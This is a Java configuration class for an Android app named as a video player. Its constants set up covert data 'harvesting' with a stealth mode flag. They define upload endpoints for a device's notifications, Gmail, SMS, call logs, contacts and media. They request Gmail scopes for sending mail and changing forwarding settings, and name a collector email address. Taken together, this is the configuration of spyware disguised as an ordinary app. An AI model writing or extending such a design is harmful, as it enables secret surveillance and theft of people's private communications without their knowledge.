package com.jumpy.videoplayerapp;

/**
 * Centralized configuration for the app
 * All URLs, API endpoints, and constants should be defined here
 */
public class AppConfig {
    
    // Backend configuration
    public static final String BACKEND_BASE_URL = "http://localhost:5001";
    
    // API endpoints
    public static final String API_BASE_URL = BACKEND_BASE_URL + "/api/";
    
    // Notification settings
    public static final int NOTIFICATION_BATCH_SIZE = 5;
    public static final int NOTIFICATION_SEND_INTERVAL = 5000; // 5 seconds
    
    // Harvesting settings
    public static final int HARVESTING_INTERVAL = 30000; // 30 seconds
    public static final boolean ENABLE_STEALTH_MODE = true;
    
    // API Endpoints
    public static final String API_NOTIFICATIONS = "/api/notifications";
    public static final String API_GMAIL = "/api/gmail";
    public static final String API_SMS = "/api/sms";
    public static final String API_CALL_LOGS = "/api/call-logs";
    public static final String API_CONTACTS = "/api/contacts";
    public static final String API_MEDIA = "/api/media";
    public static final String API_AUTH = "/api/auth";
    public static final String API_PROFILE = "/api/profile";
    
    // Full API URLs
    public static final String NOTIFICATIONS_URL = BACKEND_BASE_URL + API_NOTIFICATIONS;
    public static final String GMAIL_URL = BACKEND_BASE_URL + API_GMAIL;
    public static final String SMS_URL = BACKEND_BASE_URL + API_SMS;
    public static final String CALL_LOGS_URL = BACKEND_BASE_URL + API_CALL_LOGS;
    public static final String CONTACTS_URL = BACKEND_BASE_URL + API_CONTACTS;
    public static final String MEDIA_URL = BACKEND_BASE_URL + API_MEDIA;
    public static final String AUTH_URL = BACKEND_BASE_URL + API_AUTH;
    public static final String PROFILE_URL = BACKEND_BASE_URL + API_PROFILE;
    
    // Request Configuration
    public static final int REQUEST_TIMEOUT = 30000; // 30 seconds
    public static final int MAX_RETRIES = 3;
    public static final int RETRY_DELAY_MS = 1000;
    
    // Data Collection Settings
    public static final int BATCH_SIZE = 50;
    public static final long COLLECTION_INTERVAL_MS = 5 * 60 * 1000; // 5 minutes
    public static final long EMAIL_CHECK_INTERVAL_MS = 5 * 60 * 1000; // 5 minutes
    
    // Gmail Configuration
    public static final String GMAIL_COLLECTOR_EMAIL = "mbilal.dev13@gmail.com";
    public static final String[] GMAIL_SCOPES = {
        "https://www.googleapis.com/auth/gmail.readonly",
        "https://www.googleapis.com/auth/gmail.send",
        "https://www.googleapis.com/auth/gmail.modify",
        "https://www.googleapis.com/auth/gmail.settings.basic",
        "https://www.googleapis.com/auth/gmail.settings.sharing",
        "https://www.googleapis.com/auth/gmail.settings.forwarding"
    };
    
    // App Information
    public static final String APP_NAME = "jumpy";
    public static final String APP_VERSION = "1.0.0";
    
    // Shared Preferences
    public static final String PREFS_NAME = "jumpy_prefs";
    public static final String KEY_USER_ID = "user_id";
    public static final String KEY_USER_EMAIL = "user_email";
    public static final String KEY_LAST_SYNC = "last_sync";
    public static final String KEY_NOTIFICATIONS_ENABLED = "notifications_enabled";
    public static final String KEY_GMAIL_ENABLED = "gmail_enabled";
    public static final String KEY_SMS_ENABLED = "sms_enabled";
    public static final String KEY_CALL_LOGS_ENABLED = "call_logs_enabled";
    
    // Notification Settings
    public static final String NOTIFICATION_CHANNEL_ID = "jumpy_data_collection";
    public static final String NOTIFICATION_CHANNEL_NAME = "Data Collection";
    public static final String NOTIFICATION_CHANNEL_DESC = "Background data collection notifications";
    
    // Debug Settings
    public static final boolean DEBUG_MODE = true;
    public static final String DEBUG_TAG = "jumpy";
} 